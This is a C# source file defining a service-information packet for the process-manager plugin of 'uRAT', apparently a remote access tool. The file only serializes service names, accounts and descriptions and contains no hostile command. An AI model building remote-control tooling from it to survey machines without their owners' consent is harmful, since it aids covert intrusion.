using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.ManagersPlugin.ProcessManager.Packets
{
    class ServiceInformationPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 10; }
        }

        public string Service { get; set; }
        public string DisplayName { get; set; }
        public string StartName { get; set; }
        public string Description { get; set; }

        public void SerializeTo(Stream stream)
        {
            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(Service);
            bw.Write(DisplayName);
            bw.Write(StartName);
            bw.Write(Description);
        }

        public void DeserializeFrom(Stream stream)
        {
   
                var br = new BinaryReader(stream);
            br.ReadInt32();
                Service = br.ReadString();
                DisplayName = br.ReadString();
                StartName = br.ReadString();
                Description = br.ReadString();
     
        }
    }
}
